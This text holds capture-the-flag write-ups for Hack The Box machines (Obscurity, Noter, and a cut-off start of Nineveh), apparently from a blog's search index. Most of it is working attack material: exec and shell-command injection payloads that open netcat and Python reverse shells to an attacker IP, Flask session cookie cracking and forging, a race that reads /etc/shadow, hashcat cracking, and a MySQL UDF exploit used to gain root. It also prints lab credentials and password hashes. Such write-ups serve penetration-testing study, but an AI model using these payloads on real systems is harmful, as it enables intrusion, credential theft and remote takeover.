\\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n      \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n       \\/_/    \\/_/   \\/___/    \\/_/\n\n    v1.0-rc1\n\n:: Method : GET :: URL : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________\ndevelop [Status: 200, Size: 5892, Words: 1806, Lines: 171] :: Progress: [4614/4614] :: 461 req/sec :: Duration: [0:00:10] :: Errors: 0 ::\nURL to Source Code: http://obscurity.htb:8080/develop/SuperSecureServer.py\nReading the source code we find a voulnerable exec-function on line 139. exec(info.format(path)) # This is how you do string formatting, right?\nThis can also be identified using bandit. root@p3:/opt/htb/machines/obscurity# bandit SuperSecureServer.py ————————————————– &gt;&gt; Issue: [B102:exec_used] Use of exec detected. Severity: Medium Confidence: High Location: SuperSecureServer.py:139 More Info: https://bandit.readthedocs.io/en/latest/plugins/b102_exec_used.html 138 info = “output = ‘Document: {}’” # Keep the output for later debug 139 exec(info.format(path)) # This is how you do string formatting, right? 140 cwd = os.path.dirname(os.path.realpath(file))\n\nThe code tells us that path = urllib.parse.unquote(path). Looking at urlparse we find that everything behind / will be path. This is where we should execute our code (http://obscurity.htb:8080/EXPLOIT-CODE-HERE) &gt;&gt;&gt; o = urlparse(‘http://www.cwi.nl:80/%7Eguido/Python.html’) &gt;&gt;&gt; o ParseResult(scheme=‘http’, netloc=‘www.cwi.nl:80’, path=‘/%7Eguido/Python.html’, params=’‘, query=’‘, fragment=’’)\nSetup a local nc listener and execute a python reverse shell. Break the exec-funtion using ’; at the beginning of line and end it with #. Below are two diffrenet types of shell approaches.\nNative:\n\nOS System, NC Reverse ’;os.system(“rm /tmp/f ; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&1|nc 10.10.14.9 4488 &gt; /tmp/f”);#\nPython Reverse (Pentestmonkey) ’;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.14.9”,4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);#\n\nURL-Encoded:\n\nOS System, NC Reverse %27%3Bos.system%28%22rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.9%204488%20%3E%20%2Ftmp%2Ff%22%29%3B%23\nPython Reverse (Pentestmonkey) %27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.9%22%2C4488%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%23\n\nroot@p3:/opt/htb/machines/obscurity# curl -X POST http://obscurity.htb:8080/%27%3Bos.system%28%22rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.9%204488%20%3E%20%2Ftmp%2Ff%22%29%3B%23 root@p3:/opt/htb/machines/obscurity# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.9] from (UNKNOWN) [10.10.10.168] 60698 $ id uid=33(www-data) gid=33(www-data) groups=33(www-data)\nUpgrade the shell. In /home/robert we find a python encryption scrip, two test files (check.txt & out.txt), and pass-file.\nTest Files: www-data@obscure:/home/robert$ cat check.txt Encrypting this file with your key should result in out.txt, make sure your key is correct! www-data@obscure:/home/robert$ cat out.txt ¦ÚÈêÚÞØÛÝÝ ×ÐÊß ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè ÎÍÚÎëÑÓäáÛÌ× v\nEncrypted password-file: www-data@obscure:/home/robert$ cat passwordreminder.txt ´ÑÈÌÉàÙÁÑé¯·¿\nAnd the actuall encryption/decryption scrip, SuperSecureCrypt.py.\nSince we have both check.txt and out.txt we can reverse the script to get the key. Easiest way to do this would to write a script that loop through all letters to look for a match. This can also be done manually, which I did.\nEncrypt check.txt with key a, check if the first letter match out.txt (using vi), if it does move on to the next character. root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k a root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k al root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k ale .. root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k alexandrovich\nThe encrypted out.txt and test-out.txt matches, hence the key is alexandrovich\nNOTE: Writing a bruteforce script using rockyou.txt is also applicable, however ‘alexandrovich’ is on row 10 245 981. My bruteforce script had been running for about 3 hours and was on word ‘tariq1’ - line 128 767. root@p3:/opt/htb/machines/obscurity# cat /usr/share/wordlists/rockyou.txt | grep -n alexandrovich 10245981:alexandrovich root@p3:/opt/htb/machines/obscurity# cat /usr/share/wordlists/rockyou.txt | grep -n tariq1 128767:tariq1\nDecrypt passwordreminder.txt using the found key. Grab user.txt root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o pass-decrypt.txt -k alexandrovich Opening file passwordreminder.txt… Decrypting… Writing to pass-decrypt.txt… root@p3:/opt/htb/machines/obscurity# cat pass-decrypt.txt SecThruObsFTW\nSSH CREDENTIALS: robert:SecThruObsFTW\nroot@p3:/opt/htb/machines/obscurity# ssh robert@obscurity.htb robert@obscurity.htb’s password: (SecThruObsFTW) Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) Last login: Thu Dec 12 13:04:18 2019 from 10.10.14.9 robert@obscure:~$ cat user.txt e4493782066b55fe2755708736ada2d7\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nSudo -l shows that we can run the script BetterSSH.py as sudo. robert@obscure:/tmp/SSH$ sudo -l Matching Defaults entries for robert on obscure: env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin\nUser robert may run the following commands on obscure: (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py\nRunning the script we can see that it tries to create a temporary file to /tmp/SSH/RANDOM-NAME and compare it to /etc/shadow\nRunning without sudo shows we don’t have permissions to /etc/shadow robert@obscure:/tmp$ /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Enter username: root Enter password: root Traceback (most recent call last): File “/home/robert/BetterSSH/BetterSSH.py”, line 15, in  with open(‘/etc/shadow’, ‘r’) as f: PermissionError: [Errno 13] Permission denied: ‘/etc/shadow’\nRunning as sudo the file/dir doesn’t exist robert@obscure:/tmp$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Enter username: root Enter password: root Traceback (most recent call last): File “/home/robert/BetterSSH/BetterSSH.py”, line 24, in  with open(‘/tmp/SSH/’+path, ‘w’) as f: FileNotFoundError: [Errno 2] No such file or directory: ‘/tmp/SSH/NeXWO4w1’\nCreate the dir /tmp/SSH and run the script again with sudo robert@obscure:/tmp$ mkdir /tmp/SSH robert@obscure:/tmp$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Enter username: root Enter password: root Incorrect pass\nWe need a way to grab the temporary created file from /tmp/SSH to get the hashes from /etc/shadow. Using the watch command with timer 0.1 seconds (-n 0) we can see that the file is created and removed.\nrobert@obscure:/tmp/SSH$ watch -cd -n 0 cat /tmp/SSH/*\nIn order to capture data we need to write the watch output to a file, we write a simple script for this.\nrobert@obscure:/tmp$ cat watch-root.sh #!/bin/bash while true do cat /tmp/SSH/* &gt;&gt; /tmp/root-out.txt sleep 0.1 done\nRun the watch-script, run BetterSSH.py and grab the hashes from /etc/shadow.\nrobert@obscure:/tmp$ ./watch-root.sh cat: ’/tmp/SSH/*’: No such file or directory .. ..\nrobert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py Enter username: root Enter password: root Incorrect pass\nrobert@obscure:/tmp$ cat root-out.txt root \\(6\\)riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1\nWe now have the type 6 password hash (SHA-512) of root. We can crack this using hashcat -m1800 root@p3:/opt/htb/machines/obscurity# echo “$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1” | tee root.hash root@p3:/opt/htb/machines/obscurity# hashcat -a0 -m1800 root.hash /usr/share/wordlists/rockyou.txt -o root.cracked –force Session……….: hashcat Status………..: Cracked Hash.Type……..: sha512crypt \\(6\\), SHA512 (Unix) Hash.Target……: \\(6\\)riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbV…1h4dy1 Time.Started…..: Thu Dec 12 15:26:11 2019 (2 secs) Time.Estimated…: Thu Dec 12 15:26:13 2019 (0 secs) Guess.Base…….: File (/usr/share/wordlists/rockyou.txt) Guess.Queue……: 1/1 (100.00%) Speed.#1………: 491 H/s (6.72ms) @ Accel:64 Loops:32 Thr:1 Vec:4 Recovered……..: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts Progress………: 768/14344385 (0.01%) Rejected………: 0/768 (0.00%) Restore.Point….: 0/14344385 (0.00%) Restore.Sub.#1…: Salt:0 Amplifier:0-1 Iteration:4992-5000 Candidates.#1….: 123456 -&gt; james1\nStarted: Thu Dec 12 15:26:02 2019 Stopped: Thu Dec 12 15:26:14 2019\nroot@p3:/opt/htb/machines/obscurity# cat root.cracked \\(6\\)riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes\nEscalate from robert to root, grab root.txt. robert@obscure:~$ su Password: (mercedes) root@obscure:/home/robert# id uid=0(root) gid=0(root) groups=0(root) root@obscure:/home/robert# cat /root/root.txt 512fd4429f33a113a44d5acde23609e3\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nWatch https://ubuntuforums.org/showthread.php?t=2008978 https://unix.stackexchange.com/questions/56093/output-of-watch-command-as-a-list\nHashcat https://samsclass.info/123/proj10/p12-hashcat.htm ```"
  },
  {
    "objectID": "posts/2022-05-23-htb-writeup-noter/2022-05-23-htb-writeup-noter.html",
    "href": "posts/2022-05-23-htb-writeup-noter/2022-05-23-htb-writeup-noter.html",
    "title": "Noter - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n➜  noter nmap -p- -Pn 10.10.11.160 -v\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n5000/tcp open  upnp\n\n\n➜  noter nmap -Pn -n -sCV -p21,22,5000 10.10.11.160\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)\n|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)\n|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)\n5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)\n|_http-title: Noter\n|_http-server-header: Werkzeug/2.0.2 Python/3.8.10\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n\n➜  noter sudo nmap -sU --top-port=50 --open 10.10.11.160\nPORT   STATE         SERVICE\n68/udp open|filtered dhcpc\nFTP is always fun, however from nmap it doesn’t seem like anonymous logins are enabled. Checking this manually confirms that’s the case.\nWerkzeug has a known code execution if debug is enabled, quickly check with script in Kali.\n➜  Downloads python2 /usr/share/exploitdb/exploits/multiple/remote/43905.py 10.10.11.160 5000 10.10.14.26 4488\n[-] Debug is not enabled\nBrowse port 5000 and we are met with a very simple page. \nTrying bacis authentication bypasses doesn’t give anything, so instead we create an account with credentials admin:admin.\nWhen posting a new note, pressing the ? icon we find the information CKEditor 4.6.2 (revision 20af917). Googling around it seems to be vulnerable to XSS, although the post seems to be done with a CDN, so not local and should not be seen as a attack vector.\n    &lt;script src=\"//cdn.ckeditor.com/4.6.2/basic/ckeditor.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n      CKEDITOR.replace('editor')\n    &lt;/script&gt;\nAfter some enumeration I finally found that the login validates if the username is correct or not. Trying to login with an invalid user gives the error Invalid credentials, however trying a valid user and wrong password gives Invalid login.\nWith this information we send the login to Burp Intruder, add the two strings to “Grep - Match” and brute force the user using Burp built-in Usernames list.\n\nAdmin is my registered user, however blue is not - we found a valid user!\n\n\nStep 2\nNext we need to find the credentials for user blue, we can try to brute force the login which would cause a lot of noice, but we can also try to to crack the JWT (as it’s HMAC).\n\nRunning webanalyze we find that Flask is running on the backend. Reading through HackTricks about Flask we find the tool Flask-Unsign which is used to fetch, decode, brute-force and craft session cookies of Flask applications - perfect!\n➜  webanalyze ./webanalyze -host http://10.10.11.160:5000\nhttp://10.10.11.160:5000 (0.1s):\n    Bootstrap,  (UI frameworks)\n    Flask, 2.0.2 (Web frameworks, Web servers)\n    Python,  (Programming languages)\n    Python, 3.8.10 (Programming languages)\n➜  noter flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI'\n{'logged_in': True, 'username': 'asdf'}\n\n➜  noter flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZiJ9.YosnvA.92mU6dpP4-5opRXc6h2EhLq8hVI' --no-literal-eval\n[*] Session decodes to: {'logged_in': True, 'username': 'asdf'}\n[*] Starting brute-forcer with 8 threads..\n[+] Found secret key after 17152 attempts\nb'secret123'\n\n➜  noter flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'blue'}\" --secret 'secret123'                                                   \neyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yos0Lw.Lp1b4zGs-GrDuPvgxv2kkkC3qzE\nChange the browser session cookie and refresh the page, and boom we are blue! Note: As a VIP user we can Import and Export notes.\n\n\n\nStep 3\nBlue have two notes and in one of them we find the clear text credentials to the FTP - blue:blue@Noter! But we also find the username ftp_admin. \nLogin to the FTP using found credentials. Within we find the file policy.pdf, download the file and review it.\n➜  noter ftp 10.10.11.160\nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:void): blue \n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 1002     1002         4096 May 02 23:05 files\n-rw-r--r--    1 1002     1002        12569 Dec 24 20:59 policy.pdf\n226 Directory send OK.\nftp&gt; mget *\nmget policy.pdf? y\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for policy.pdf (12569 bytes).\n226 Transfer complete.\n12569 bytes received in 0.00 secs (9.2992 MB/s)\nThe pdf is a password policy, and within we find the line; “Default user-password generated by the application is in the format of”username@site_name!” (This applies to all your applications)“\nWe can try if this applies to ftp_admin:ftp_admin@Noter! as well.\n➜  noter ftp 10.10.11.160                                                                           \nConnected to 10.10.11.160.\n220 (vsFTPd 3.0.3)\nName (10.10.11.160:void): ftp_admin\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp&gt; ls\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\n-rw-r--r--    1 1003     1003        25559 Nov 01  2021 app_backup_1635803546.zip\n-rw-r--r--    1 1003     1003        26298 Dec 01 05:52 app_backup_1638395546.zip\n226 Directory send OK.\nftp&gt; mget *\nmget app_backup_1635803546.zip? y\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).\n226 Transfer complete.\n25559 bytes received in 0.03 secs (783.7460 kB/s)\nmget app_backup_1638395546.zip? y\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for app_backup_1638395546.zip (26298 bytes).\n226 Transfer complete.\n26298 bytes received in 0.03 secs (811.6058 kB/s)\n\n\nStep 4\nReview the backup files app_backup_1638395546 and we find.. .. MySQL Config - app.py\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'DB_user'\napp.config['MYSQL_PASSWORD'] = 'DB_password'\napp.config['MYSQL_DB'] = 'app'\nReview the older backup, app_backup_1635803546, and we find.. .. MySQL Config - app.py\napp.config['MYSQL_HOST'] = 'localhost'\napp.config['MYSQL_USER'] = 'root'\napp.config['MYSQL_PASSWORD'] = 'Nildogg36'\napp.config['MYSQL_DB'] = 'app'\nLooking on the import and export functions we find and dangerous subprocess with shell=True, we can most likely exploit this function to get a reverse shell.\n# Export remote\n@app.route('/export_note_remote', methods=['POST'])\n@is_logged_in\ndef export_note_remote():\n    if check_VIP(session['username']):\n        try:\n            url = request.form['url']\n\n            status, error = parse_url(url)\n\n            if (status is True) and (error is None):\n                try:\n                    r = pyrequest.get(url,allow_redirects=True)\n                    rand_int = random.randint(1,10000)\n                    command = f\"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}\"\n                    subprocess.run(command, shell=True, executable=\"/bin/bash\")\nCreate a python3 revshell in a markdown file, and break the command synax as seen above, to execute our malicious revshell.\n➜  noter cat rev.md \n';python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.26\",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")' # '\nExport the file and grab the shell.\n\n➜  noter python3 -m http.server 80  \nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...\n10.10.11.160 - - [23/May/2022 10:39:35] \"GET /rev.md HTTP/1.1\" 200 -\n\n➜  noter nc -lvnp 4488            \nlistening on [any] 4488 ...\nconnect to [10.10.14.26] from (UNKNOWN) [10.10.11.160] 50188\n/bin/sh: 0: can't access tty; job control turned off\n$ id && hostname\nuid=1001(svc) gid=1001(svc) groups=1001(svc)\nnoter\n$ cat user.txt  \n39482bdad8ae80f8eb950cab59f5ffc2\n\n\n\n\nROOT\n\nStep 1\nMy first finding was the backup script backup.sh, and within we see the astirix being used. Here I spent some time looking if it was possible to exploit using shell globbing but to no avail.\nsvc@noter:/$ ls -al /opt\ntotal 12\ndrwxr-xr-x  2 root root 4096 May  2 23:05 .\ndrwxr-xr-x 19 root root 4096 May  2 23:05 ..\n-rwxr--r--  1 root root  137 Dec 30 09:41 backup.sh\nsvc@noter:/$ cd opt\nsvc@noter:/opt$ cat backup.sh\n#!/bin/bash\nzip -r `echo /home/svc/ftp/admin/app_backup_$(date +%s).zip` /home/svc/app/web/* -x /home/svc/app/web/misc/node_modules/**\\*\nInstead I moved on to the MySQL database, to which we found root credentials in one of the backup files. (root:Nildogg36)\nDownload the privesc https://www.exploit-db.com/exploits/1518 and write it to file, raptor_udf2.c. We meet all the criterias as we can login to MySQL as root. Create a user defined function for code execution and grab sensitive files and/or setup a reverse shell.\nsvc@noter:/dev/shm$ wget http://10.10.14.26/raptor_udf2.c\nsvc@noter:/dev/shm$ gcc -g -c raptor_udf2.c\nsvc@noter:/dev/shm$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc\nsvc@noter:/dev/shm$ ls -al\ndrwxrwxrwt  3 root root   120 May 23 11:39 .\ndrwxr-xr-x 20 root root  4040 May 23 10:46 ..\ndrwx------  4 root root    80 May 23 10:46 multipath\n-rw-r--r--  1 svc  svc   4920 May 23 11:39 raptor_udf2.c\n-rw-r--r--  1 svc  svc   7432 May 23 11:39 raptor_udf2.o\n-rwxr-xr-x  1 svc  svc  19360 May 23 11:39 raptor_udf2.so\n\nsvc@noter:~/app/web$ mysql --user=root -p --host localhost\nEnter password: Nildogg36\n\n\nMariaDB [(none)]&gt; use mysql;\nMariaDB [mysql]&gt; show variables like '%plugin%';\nshow variables like '%plugin%';\n+-----------------+---------------------------------------------+\n| Variable_name   | Value                                       |\n+-----------------+---------------------------------------------+\n| plugin_dir      | /usr/lib/x86_64-linux-gnu/mariadb19/plugin/ |\n| plugin_maturity | gamma                                       |\n+-----------------+---------------------------------------------+\n2 rows in set (0.001 sec)\n\nMariaDB [mysql]&gt; create table foo(line blob);\ncreate table foo(line blob);\nQuery OK, 0 rows affected (0.006 sec)\n\nMariaDB [mysql]&gt; insert into foo values(load_file('/dev/shm/raptor_udf2.so'));\ninsert into foo values(load_file('/dev/shm/raptor_udf2.so'));\nQuery OK, 1 row affected (0.003 sec)\n\nMariaDB [mysql]&gt; select * from foo into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so';\nadb19/plugin/raptor_udf2.so';le '/usr/lib/x86_64-linux-gnu/mari \nQuery OK, 1 row affected (0.001 sec)\n\nMariaDB [mysql]&gt; create function do_system returns integer soname 'raptor_udf2.so';\no';ate function do_system returns integer soname 'raptor_udf2.s \nQuery OK, 0 rows affected (0.001 sec)\n\nMariaDB [mysql]&gt; select * from mysql.func;\nselect * from mysql.func;\n+-----------+-----+----------------+----------+\n| name      | ret | dl             | type     |\n+-----------+-----+----------------+----------+\n| do_system |   2 | raptor_udf2.so | function |\n+-----------+-----+----------------+----------+\n\nMariaDB [mysql]&gt; select do_system('cat /root/root.txt &gt; /dev/shm/flag.txt; chown svc:svc /dev/shm/flag.txt');\n svc:svc /dev/shm/flag.txt');oot.txt &gt; /dev/shm/flag.txt; chown \n+--------------------------------------------------------------------------------------+\n| do_system('cat /root/root.txt &gt; /dev/shm/flag.txt; chown svc:svc /dev/shm/flag.txt') |\n+--------------------------------------------------------------------------------------+\n|                                                                                    0 |\n+--------------------------------------------------------------------------------------+\n1 row in set (0.003 sec)\n\nMariaDB [mysql]&gt; select do_system('cat /etc/shadow &gt; /dev/shm/shadow; chown svc:svc /dev/shm/shadow');\nsvc /dev/shm/shadow');/etc/shadow &gt; /dev/shm/shadow; chown svc: \n+-------------------------------------------------------------------------------+\n| do_system('cat /etc/shadow &gt; /dev/shm/shadow; chown svc:svc /dev/shm/shadow') |\n+-------------------------------------------------------------------------------+\n|                                                                             0 |\n+-------------------------------------------------------------------------------+\n1 row in set (0.004 sec)\nReap the rewards and prosper.\nsvc@noter:/dev/shm$ ls -al\nls -al\ntotal 44\ndrwxrwxrwt  3 root root   200 May 23 13:05 .\ndrwxr-xr-x 20 root root  4040 May 23 12:51 ..\n-rw-rw----  1 svc  svc     33 May 23 13:02 flag.txt\n-rw-rw----  1 svc  svc    152 May 23 13:01 ls\ndrwx------  4 root root    80 May 23 12:51 multipath\n-rw-r--r--  1 svc  svc   3300 May 23 12:51 raptor_udf2.c\n-rw-r--r--  1 svc  svc   7432 May 23 12:54 raptor_udf2.o\n-rwxr-xr-x  1 svc  svc  19360 May 23 12:54 raptor_udf2.so\n-rw-rw----  1 svc  svc   1474 May 23 13:05 shadow\n\nsvc@noter:/dev/shm$ cat ls\ntotal 8\ndrwx------ 2 root root 4096 May  2 23:05 .\ndrwx------ 9 root root 4096 May  2 23:05 ..\n-rw------- 1 root root    0 Dec 21 20:38 authorized_keys\n\nsvc@noter:/dev/shm$ cat flag.txt\n6c96f935fcd96c108b9abaa111e3c613\n\nsvc@noter:/dev/shm$ cat shadow\nroot:$6$09RSjU3jIh/2JW1u$8jlcYzW5Oyzgh/TrlTPX5Wq2HMTA6zUooij/9j0.NIttTYp4x0h6wmq8chrcdtvNpZzHlHzwsI8GesOKI3NYn.:18991:0:99999:7:::\nsvc:$6$gTM.AIsgDue4r5AQ$wUBfUtg7/svAcRTnsFv51KuMpeNP0cL6vqIR3608pzd0YsNNe0oxMwvY7iAGMCgMp7viiBLUwUaAZx4r6ljME/:18988:0:99999:7:::\nftp_admin:$6$gQyFQc6w7p83bBwZ$6zYRlPKPBp6GMgUI5mbojxOvyup7hqrQ5hfscnLkwvIimC6qO5a0taiju1vYQPSnzf.mO5TgCdo.5RiO9Gu7J0:19114:0:99999:7:::\nblue:$6$pNud9u/1PdD8qPYi$cSe5FPCRGH5xjUiEMJ5tXSclSrWSz7gimtR2IcXiiVk0xNfSACcVgU3C4z69RnZHEQKrNO/hIiUQdVTqlxb29.:19114:0:99999:7:::\n\n\n\n\nReferences\nPrivesc, MySQL User Defined Functions https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf https://www.exploit-db.com/exploits/1518"
  },
  {
    "objectID": "posts/2021-02-21-htb-writeup-nineveh/2021-02-21-htb-writeup-nineveh.html",
    "href": "posts/2021-02-21-htb-writeup-nineveh/2021-02-21-htb-writeup-nineveh.html",
    "title": "Nineveh - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/nineveh]# nmap -Pn -n -sCV 10.10.10.43 –open (master✱) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn’t have a title (text/html). 443/tcp open ssl/http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR | Not valid before: 2017-07-01T15:03:30 |_Not valid after: 2018-07-01T15:03:30 |ssl-date: TLS randomness does not represent time | tls-alpn: | http/1.1\n\nDIRB (port 80): + http://10.10.10.43/index.html (CODE:200|SIZE:178) + http://10.10.10.43/info.php (CODE:200|SIZE:83767) + http://10.10.10.43/server-status (CODE:403|SIZE:299)\nDIRB (port 443): ==&gt; DIRECTORY: https://10.10.10.43/db/ + https://10.10.10.43/index.html (CODE:200|SIZE:49) + https://10.10.10.43/server-status (CODE:403|SIZE:300)\nNIKTO (port80): + Allowed HTTP Methods: OPTIONS, GET, HEAD, POST\n\nPort 80 is just a default, empty, page. While on port 443 we find an image. Download the image and run ‘binwalk’ to see if there’s anything hidden inside it.\n[root:/git/htb/nineveh]# binwalk ninevehForAll.png (master✱)\n\n\n\nDECIMAL HEXADECIMAL DESCRIPTION\n\n\n\n\n0 0x0 PNG image, 1336 x 508, 8-bit/color RGB, non-interlaced\n\n\n84 0x54 Zlib compressed data, best compression\n\n\n\n[root:…ninevehForAll.png.extracted]# ls -al (master✱) total 556 drwxr-xr-x 2 root root 4096 Feb 25 14:00 . drwxr-xr-x 3 root root 4096 Feb 25 14:00 .. -rw-r–r– 1 root root 0 Feb 25 14:00 54 -rw-r–r– 1 root root 560768 Feb 25 14:00 